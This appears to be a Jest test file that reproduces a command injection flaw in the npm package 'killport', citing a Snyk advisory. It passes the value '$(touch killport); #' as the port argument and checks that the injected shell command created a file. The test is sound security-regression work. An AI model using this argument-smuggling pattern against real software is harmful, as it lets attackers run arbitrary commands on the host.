//https://snyk.io/vuln/SNYK-JS-KILLPORT-1078535
test("Command Injection in killport", () => {
  const killport = require("killport");
  const fs = require("fs");
  const path = "./killport";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  killport("$(touch killport); #");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
